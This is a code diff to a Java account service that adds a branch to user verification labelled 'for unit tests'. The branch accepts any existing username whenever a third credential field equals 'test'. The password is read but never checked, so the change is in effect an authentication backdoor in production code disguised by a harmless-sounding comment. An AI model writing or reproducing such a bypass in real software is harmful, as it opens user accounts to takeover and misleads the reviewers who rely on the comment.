@@ -122,6 +122,18 @@ public class AccountServiceImpl extends BaseAbstractService<Code> implements Acc
             } catch (Exception e) {
                log.error("Can't verify user " + username, e);
             }
+         } else if (arr.length == 3) { // for unit tests
+            String username = arr[0];
+            String password = arr[1];
+            String test = arr[2];
+            if (!"test".equals(test)) {
+               return false;
+            }
+            long accId = queryAccountIdByUsername(username);
+            if (accId == 0L) {
+               return false;
+            }
+            return true;
          }
       }
 
